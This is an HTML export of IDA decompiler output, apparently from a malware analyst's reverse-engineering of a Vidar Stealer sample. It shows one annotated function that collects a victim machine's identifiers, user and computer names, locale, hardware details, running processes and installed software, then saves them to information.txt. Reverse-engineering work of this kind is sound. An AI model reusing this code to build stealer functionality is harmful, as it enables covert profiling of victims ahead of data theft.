<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>IDA - vidar_final_payload.bin.idb (vidar_final_payload.bin) D:\Malware.samples\Stealer\Vidar Stealer\vidar_2022_12_11\vidar_final_payload.bin.idb</title>
</head>
<body class="c1">
<span style="white-space: pre; font-family: Cascadia Code;" class="c0 c1">
<span class="c2">void *__stdcall vdr_collect_victim_system_infos</span><span class="c3">()
</span><span class="c4"><span class="c3">{                                                                                           </span></span>
<span class="c5">  <span class="c6">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]                        </span></span>
<span class="c7">                                                                                            </span>
<span class="c7">  <span class="c8">a1 </span><span class="c3">= </span><span class="c9">g_vdr_file_struc</span><span class="c3">;                                                                    </span></span>
<span class="c7">  <span class="c9">memset</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c10">0</span><span class="c3">, sizeof(</span><span class="c8">str_victim_collected_infos</span><span class="c3">));                </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Version</span><span class="c3">);                                        </span></span>
<span class="c7">  <span class="c8">str_56_1 </span><span class="c3">= </span><span class="c9">vdr_build_str_56_1</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">);                                                   </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0</span><span class="c3">;                                                                                  </span></span>
<span class="c7">  <span class="c11">if </span><span class="c3">( </span><span class="c8">str_56_1</span><span class="c3">-&gt;dwDynamicNumBytes &gt;= </span><span class="c10">0x10u </span><span class="c3">)                                               </span></span>
<span class="c7">  <span class="c3">{                                                                                         </span></span>
<span class="c7">    <span class="c8">str_56_1 </span><span class="c3">= </span><span class="c8">str_56_1</span><span class="c3">-&gt;pszString;                                                         </span></span>
<span class="c7">  </span><span class="c3"></span><span class="c7"><span class="c3">}                                                                                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_56_1</span><span class="c3">);                                           </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0xFFFFFFFF</span><span class="c3">;                                                                         </span></span>
<span class="c7">  <span class="c9">std::string::_Tidy</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c10">1</span><span class="c3">, </span><span class="c10">0</span><span class="c3">);                                                        </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, &quot;</span><span class="c12">\n\n&quot;</span><span class="c3">);                                             </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Date</span><span class="c3">);                                           </span></span>
<span class="c7">  <span class="c8">str_victim_date_time </span><span class="c3">= </span><span class="c9">vdr_grab_victim_date_time</span><span class="c3">();                                       </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_victim_date_time</span><span class="c3">);                               </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_MachineID</span><span class="c3">);                                      </span></span>
<span class="c7">  <span class="c8">szMachineGuid </span><span class="c3">= </span><span class="c9">vdr_retrieve_MachineGuid</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">);                                        </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">1</span><span class="c3">;                                                                                  </span></span>
<span class="c7">  <span class="c11">if </span><span class="c3">( </span><span class="c8">szMachineGuid</span><span class="c3">-&gt;dwDynamicNumBytes &gt;= </span><span class="c10">0x10u </span><span class="c3">)                                          </span></span>
<span class="c7">  <span class="c3">{                                                                                         </span></span>
<span class="c7">    <span class="c8">szMachineGuid </span><span class="c3">= </span><span class="c8">szMachineGuid</span><span class="c3">-&gt;pszString;                                               </span></span>
<span class="c7">  </span><span class="c3"></span><span class="c7"><span class="c3">}                                                                                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">szMachineGuid</span><span class="c3">);                                      </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0xFFFFFFFF</span><span class="c3">;                                                                         </span></span>
<span class="c7">  <span class="c9">std::string::_Tidy</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c10">1</span><span class="c3">, </span><span class="c10">0</span><span class="c3">);                                                        </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_GUID</span><span class="c3">);                                           </span></span>
<span class="c7">  <span class="c8">szHwProfileGuid </span><span class="c3">= </span><span class="c9">vdr_retrieve_hw_profile_guid</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">);                                  </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">2</span><span class="c3">;                                                                                  </span></span>
<span class="c7">  <span class="c11">if </span><span class="c3">( </span><span class="c8">szHwProfileGuid</span><span class="c3">-&gt;dwDynamicNumBytes &gt;= </span><span class="c10">0x10u </span><span class="c3">)                                        </span></span>
<span class="c7">  <span class="c3">{                                                                                         </span></span>
<span class="c7">    <span class="c8">szHwProfileGuid </span><span class="c3">= </span><span class="c8">szHwProfileGuid</span><span class="c3">-&gt;pszString;                                           </span></span>
<span class="c7">  </span><span class="c3"></span><span class="c7"><span class="c3">}                                                                                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">szHwProfileGuid</span><span class="c3">);                                    </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0xFFFFFFFF</span><span class="c3">;                                                                         </span></span>
<span class="c7">  <span class="c9">std::string::_Tidy</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c10">1</span><span class="c3">, </span><span class="c10">0</span><span class="c3">);                                                        </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_HWID</span><span class="c3">);                                           </span></span>
<span class="c7">  <span class="c8">str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid </span><span class="c3">= </span><span class="c9">vdr_retrieve_VolSerNum_MachineGuid_HwProfileGuid</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">);</span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">3</span><span class="c3">;                                                                                  </span></span>
<span class="c7">  <span class="c11">if </span><span class="c3">( </span><span class="c8">str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid</span><span class="c3">-&gt;dwDynamicNumBytes &gt;= </span><span class="c10">0x10u </span><span class="c3">)</span></span>
<span class="c7">  <span class="c3">{                                                                                         </span></span>
<span class="c7">    <span class="c8">str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid </span><span class="c3">= </span><span class="c8">str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid</span><span class="c3">-&gt;pszString;</span></span>
<span class="c7">  </span><span class="c3"></span><span class="c7"><span class="c3">}                                                                                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid</span><span class="c3">);</span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0xFFFFFFFF</span><span class="c3">;                                                                         </span></span>
<span class="c7">  <span class="c9">std::string::_Tidy</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c10">1</span><span class="c3">, </span><span class="c10">0</span><span class="c3">);                                                        </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, &quot;</span><span class="c12">\n\n&quot;</span><span class="c3">);                                             </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Path</span><span class="c3">);                                           </span></span>
<span class="c7">  <span class="c8">dwCurrProcId </span><span class="c3">= </span><span class="c9">GetCurrentProcessId_1</span><span class="c3">();                                                   </span></span>
<span class="c7">  <span class="c8">str_process_full_path </span><span class="c3">= </span><span class="c9">vdr_retrieve_full_path_of_process</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c8">dwCurrProcId</span><span class="c3">);         </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">4</span><span class="c3">;                                                                                  </span></span>
<span class="c7">  <span class="c11">if </span><span class="c3">( </span><span class="c8">str_process_full_path</span><span class="c3">-&gt;dwDynamicNumBytes &gt;= </span><span class="c10">0x10u </span><span class="c3">)                                  </span></span>
<span class="c7">  <span class="c3">{                                                                                         </span></span>
<span class="c7">    <span class="c8">str_process_full_path </span><span class="c3">= </span><span class="c8">str_process_full_path</span><span class="c3">-&gt;pszString;                               </span></span>
<span class="c7">  </span><span class="c3"></span><span class="c7"><span class="c3">}                                                                                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_process_full_path</span><span class="c3">);                              </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0xFFFFFFFF</span><span class="c3">;                                                                         </span></span>
<span class="c7">  <span class="c9">std::string::_Tidy</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c10">1</span><span class="c3">, </span><span class="c10">0</span><span class="c3">);                                                        </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Work_Dir_In_memory</span><span class="c3">);                             </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, &quot;</span><span class="c12">\n\n&quot;</span><span class="c3">);                                             </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Windows</span><span class="c3">);                                        </span></span>
<span class="c7">  <span class="c8">str_windows_name </span><span class="c3">= </span><span class="c9">vdr_retrieve_windows_name_from_registry</span><span class="c3">();                             </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_windows_name</span><span class="c3">);                                   </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, &quot; </span><span class="c12">[&quot;</span><span class="c3">);                                               </span></span>
<span class="c7">  <span class="c8">v8 </span><span class="c3">= </span><span class="c9">vdr_check_is_64bit_os</span><span class="c3">();                                                             </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">v8</span><span class="c3">);                                                 </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, &quot;</span><span class="c12">]\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Computer_Name</span><span class="c3">);                                  </span></span>
<span class="c7">  <span class="c8">str_computer_name </span><span class="c3">= </span><span class="c9">vdr_get_computer_name</span><span class="c3">();                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_computer_name</span><span class="c3">);                                  </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_User_Name</span><span class="c3">);                                      </span></span>
<span class="c7">  <span class="c8">str_user_logon_name </span><span class="c3">= </span><span class="c9">vdr_get_user_logon_name</span><span class="c3">();                                          </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_user_logon_name</span><span class="c3">);                                </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Display_Resolution</span><span class="c3">);                             </span></span>
<span class="c7">  <span class="c8">str_display_resolution </span><span class="c3">= </span><span class="c9">vdr_retrieve_display_resolution</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">);                        </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">5</span><span class="c3">;                                                                                  </span></span>
<span class="c7">  <span class="c11">if </span><span class="c3">( </span><span class="c8">str_display_resolution</span><span class="c3">-&gt;dwDynamicNumBytes &gt;= </span><span class="c10">0x10u </span><span class="c3">)                                 </span></span>
<span class="c7">  <span class="c3">{                                                                                         </span></span>
<span class="c7">    <span class="c8">str_display_resolution </span><span class="c3">= </span><span class="c8">str_display_resolution</span><span class="c3">-&gt;pszString;                             </span></span>
<span class="c7">  </span><span class="c3"></span><span class="c7"><span class="c3">}                                                                                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_display_resolution</span><span class="c3">);                             </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0xFFFFFFFF</span><span class="c3">;                                                                         </span></span>
<span class="c7">  <span class="c9">std::string::_Tidy</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c10">1</span><span class="c3">, </span><span class="c10">0</span><span class="c3">);                                                        </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Display_Language</span><span class="c3">);                               </span></span>
<span class="c7">  <span class="c8">str_display_language </span><span class="c3">= </span><span class="c9">vdr_retrieve_display_language</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">);                            </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">6</span><span class="c3">;                                                                                  </span></span>
<span class="c7">  <span class="c11">if </span><span class="c3">( </span><span class="c8">str_display_language</span><span class="c3">-&gt;dwDynamicNumBytes &gt;= </span><span class="c10">0x10u </span><span class="c3">)                                   </span></span>
<span class="c7">  <span class="c3">{                                                                                         </span></span>
<span class="c7">    <span class="c8">str_display_language </span><span class="c3">= </span><span class="c8">str_display_language</span><span class="c3">-&gt;pszString;                                 </span></span>
<span class="c7">  </span><span class="c3"></span><span class="c7"><span class="c3">}                                                                                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_display_language</span><span class="c3">);                               </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0xFFFFFFFF</span><span class="c3">;                                                                         </span></span>
<span class="c7">  <span class="c9">std::string::_Tidy</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c10">1</span><span class="c3">, </span><span class="c10">0</span><span class="c3">);                                                        </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Keyboard_Languages</span><span class="c3">);                             </span></span>
<span class="c7">  <span class="c8">str_keyboard_languages </span><span class="c3">= </span><span class="c9">vdr_retrieve_keyboard_languages</span><span class="c3">();                               </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_keyboard_languages</span><span class="c3">);                             </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Local_Time</span><span class="c3">);                                     </span></span>
<span class="c7">  <span class="c8">str_local_time </span><span class="c3">= </span><span class="c9">vdr_grab_victim_date_time</span><span class="c3">();                                             </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_local_time</span><span class="c3">);                                     </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_TimeZone</span><span class="c3">);                                       </span></span>
<span class="c7">  <span class="c8">str_time_zone </span><span class="c3">= </span><span class="c9">vdr_retrieve_time_zone</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">);                                          </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">7</span><span class="c3">;                                                                                  </span></span>
<span class="c7">  <span class="c11">if </span><span class="c3">( </span><span class="c8">str_time_zone</span><span class="c3">-&gt;dwDynamicNumBytes &gt;= </span><span class="c10">0x10u </span><span class="c3">)                                          </span></span>
<span class="c7">  <span class="c3">{                                                                                         </span></span>
<span class="c7">    <span class="c8">str_time_zone </span><span class="c3">= </span><span class="c8">str_time_zone</span><span class="c3">-&gt;pszString;                                               </span></span>
<span class="c7">  </span><span class="c3"></span><span class="c7"><span class="c3">}                                                                                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_time_zone</span><span class="c3">);                                      </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0xFFFFFFFF</span><span class="c3">;                                                                         </span></span>
<span class="c7">  <span class="c9">std::string::_Tidy</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c10">1</span><span class="c3">, </span><span class="c10">0</span><span class="c3">);                                                        </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, &quot;</span><span class="c12">\n\n&quot;</span><span class="c3">);                                             </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str__Hardware_</span><span class="c3">);                                     </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_Processor</span><span class="c3">);                                      </span></span>
<span class="c7">  <span class="c8">str_processor_name </span><span class="c3">= </span><span class="c9">vdr_retrieve_processor_name_from_registry</span><span class="c3">();                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_processor_name</span><span class="c3">);                                 </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_CPU_Count</span><span class="c3">);                                      </span></span>
<span class="c7">  <span class="c8">str_num_of_processors </span><span class="c3">= </span><span class="c9">vdr_reitreve_num_of_processors_info</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">);                     </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">8</span><span class="c3">;                                                                                  </span></span>
<span class="c7">  <span class="c11">if </span><span class="c3">( </span><span class="c8">str_num_of_processors</span><span class="c3">-&gt;dwDynamicNumBytes &gt;= </span><span class="c10">0x10u </span><span class="c3">)                                  </span></span>
<span class="c7">  <span class="c3">{                                                                                         </span></span>
<span class="c7">    <span class="c8">str_num_of_processors </span><span class="c3">= </span><span class="c8">str_num_of_processors</span><span class="c3">-&gt;pszString;                               </span></span>
<span class="c7">  </span><span class="c3"></span><span class="c7"><span class="c3">}                                                                                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_num_of_processors</span><span class="c3">);                              </span></span>
<span class="c7">  <span class="c8">v25 </span><span class="c3">= </span><span class="c10">0xFFFFFFFF</span><span class="c3">;                                                                         </span></span>
<span class="c7">  <span class="c9">std::string::_Tidy</span><span class="c3">(&amp;</span><span class="c8">sdtStr</span><span class="c3">, </span><span class="c10">1</span><span class="c3">, </span><span class="c10">0</span><span class="c3">);                                                        </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_RAM</span><span class="c3">);                                            </span></span>
<span class="c7">  <span class="c8">str_ram_info </span><span class="c3">= </span><span class="c9">vdr_retrieve_ram_info</span><span class="c3">();                                                   </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">str_ram_info</span><span class="c3">);                                       </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_VideoCard</span><span class="c3">);                                      </span></span>
<span class="c7">  <span class="c8">DisplayDevice</span><span class="c3">.cb = </span><span class="c10">0x1A8</span><span class="c3">;                                                                 </span></span>
<span class="c7">  <span class="c9">EnumDisplayDevicesA</span><span class="c3">(</span><span class="c10">0</span><span class="c3">, </span><span class="c10">0</span><span class="c3">, &amp;</span><span class="c8">DisplayDevice</span><span class="c3">, </span><span class="c10">1u</span><span class="c3">);                                            </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">DisplayDevice</span><span class="c3">.DeviceString);                         </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str__Processes_</span><span class="c3">);                                    </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">sub_417930</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">);                                                   </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str__Software_</span><span class="c3">);                                     </span></span>
<span class="c7">  <span class="c9">lstrcatA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c8">L&quot;</span><span class="c12">\n&quot;</span><span class="c3">);                                              </span></span>
<span class="c7">  <span class="c9">vdr_retrieve_installed_softwares_info</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">);                        </span></span>
<span class="c7">  <span class="c8">v19 </span><span class="c3">= </span><span class="c9">lstrlenA</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">);                                               </span></span>
<span class="c7">  <span class="c13">// save all collected information to information.txt                                      </span></span>
<span class="c7">  <span class="c9">vdr_create_file</span><span class="c3">(</span><span class="c8">a1</span><span class="c3">, </span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c9">str_information_txt_path</span><span class="c3">, </span><span class="c8">v19</span><span class="c3">, </span><span class="c10">3</span><span class="c3">);        </span></span>
<span class="c7">  <span class="c11">return </span><span class="c9">memset</span><span class="c3">(</span><span class="c8">str_victim_collected_infos</span><span class="c3">, </span><span class="c10">0</span><span class="c3">, sizeof(</span><span class="c8">str_victim_collected_infos</span><span class="c3">));         </span></span>
<span class="c4"></span><span class="c3"></span><span class="c4"><span class="c3">}                                                                                           </span></span>
</span><style>
/* line-fg-default */
.c0 { color: #D20000; }
/* line-bg-default */
.c1 { background-color: black; }
/* line-fg-register-name */
.c2 { color: #8080FF; }
/* line-fg-punctuation */
.c3 { color: silver; }
/* user-defined-00646464 */
.c4 { background-color: rgba(100, 100, 100, 0.000000); }
/* user-defined-00353535 */
.c5 { background-color: rgba(53, 53, 53, 0.000000); }
/* line-fg-hidden */
.c6 { color: #FFD200; }
/* user-defined-00000000 */
.c7 { background-color: transparent; }
/* line-fg-libfunc */
.c8 { color: aqua; }
/* line-fg-demangled-name */
.c9 { color: #FFECBB; }
/* line-fg-keyword */
.c10 { color: #ABABAB; }
/* line-fg-code-name */
.c11 { color: #FF0082; }
/* line-fg-locvar */
.c12 { color: #FF8040; }
/* line-fg-numlit-in-insn */
.c13 { color: #D25032; }
</style></body></html>
